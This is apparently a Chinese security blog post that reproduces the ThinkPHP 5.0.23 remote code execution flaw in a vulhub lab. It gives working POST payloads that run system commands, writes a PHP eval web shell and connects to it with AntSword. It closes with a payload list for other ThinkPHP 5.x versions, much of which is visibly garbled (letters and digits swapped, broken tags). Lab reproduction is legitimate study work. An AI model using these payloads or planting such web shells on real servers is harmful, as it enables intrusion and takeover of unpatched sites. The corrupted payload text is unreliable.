---
title: 【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞
date: 2025-09-04
categories:
  - Web攻防
  - 靶场
  - 红队
image: images/31.webp
---
# 漏洞形成原因
## 框架介绍：  
ThinkPHP是一款运用极广的PHP开发框架。
## 漏洞引入：  
其5.0.23以前的版本中，获取**method**的方法中没有正确处理方法名，导致攻击者可以调用**Request**类任意方法并构造利用链，从而导致远程代码执行漏洞。
# 漏洞如何利用
访问靶机地址+端口号 进入首页
Burp抓包修改传参方式为Post，传入参数为
```
"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=pwd"，其中pwd为系统执行命令可进行一系列操作。
```
# 环境搭建
使用**vulhub**靶场进行搭建
```
cd thinkphp/5.0.23-rce/
docker-compose up -d
docker ps
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094154.png)
访问链接：
```
http://192.168.197.140:8080/
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094245.png)

# 漏洞复现
burp抓包
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094438.png)
修改
传参方式为Post，url后接入`/index.php?s=captch`，传入参数为
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=pwd	
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094649.png)
**尝试写入phpinfo**
参数改成`echo "<?php phpinfo(); ?>" > info.php`
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo "<?php phpinfo(); ?>" > info.php
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904095528.png)
**写入一句话**
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php eval($_POST[aaa]); ?>' > shell.php
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904095644.png)
**上蚂剑**
```
http://192.168.197.140:8080/shell.php
密码：aaa
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904095726.png)
**成功**
**做完实验后关闭环境 docker-compose down**
# 更多版本
漏洞触发点和版本的不同，所以payload也不⼀样,条件也不⼀样
5.0.13~5.0.19默认情况下config中的app_debug配置项为false。
复现的时候需要开启这个
**总结⼀下 5.1.x ：**
```
?s=index/thinkRequest/input&fiLter[]=system&data=pwd

?s=index/thinkviewdriverPhp/dispLay&content=C?php phpinfo();?>

?s=index/thinktempLatedriverfiLe/write&cacheFiLe=sheLL.php&content=C? php phpinfo();?>

?s=index/thinkContainer/invokefunction&function=caLL_user_func_array&var

?s[8]=system&vars[f][]=id

?s=index/thinkapp/invokefunction&function=caLL_user_func_array&vars[8]=s ystem&vars[f][]=id
```
**5.0.x ：**
```
?s=index/thinkconfig/get&name=database.username # 获取配置信息

?s=index/thinkLang/Load&fiLe= :/ :/test.jpg # 包含任意⽂件

?s=index/thinkConfig/Load&fiLe= :/ :/t.php # 包含任意.php⽂件

?s=index/thinkapp/invokefunction&function=caLL_user_func_array&vars[8]=s ystem&vars[f][]=id

?s=index|thinkapp/invokefunction&function=caLL_user_func_array&vars[8]=s ystem&vars[f][8]=whoami
```
**5.0.13：**
```
http: "php.LocaL/thinkphp5.8.5/pubLic/index.php?s=index 
方法：post
Body内容：
_method= _construct&method=get&fiLter[]=caLL_user_func&get[]=phpinfo
_method= _construct&fiLter[]=system&method=GET&get[]=whoami
```
**其他**
```
# ThinkPHP ≤ 5.8.f3 POST /?s=index/index
s=whoami&_method= _construct&method=&fiLter[]=system

# ThinkPHP ≤ 5.8.23、5.f.8 ≤ 5.f.f6 需要开启框架app_debug 
POST /
_method= _construct&fiLter[]=system&server[REQUEST_METHOD]=Ls -aL

# ThinkPHP ≤ 5.8.23 需要存在xxx的method路由，例如captcha
POST /?s=xxx HTTP/f.f
_method= _construct&fiLter[]=system&method=get&get[]=Ls+-aL
_method= _construct&fiLter[]=system&method=get&server[REQUEST_METHOD]=L s
```



